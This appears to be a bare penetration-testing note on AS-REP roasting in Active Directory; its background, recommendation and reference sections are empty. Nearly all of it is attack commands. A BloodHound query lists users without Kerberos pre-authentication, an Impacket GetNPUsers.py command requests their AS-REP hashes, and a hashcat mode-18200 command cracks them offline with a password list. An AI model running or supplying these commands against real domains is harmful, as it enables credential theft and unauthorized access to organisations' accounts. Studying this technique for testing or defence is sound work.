## Background

## How to test for


```
MATCH (u:User {dontreqpreauth: true}) RETURN u
```

```
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

## How to exploit

```
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
```


## Recommendation

## Reference


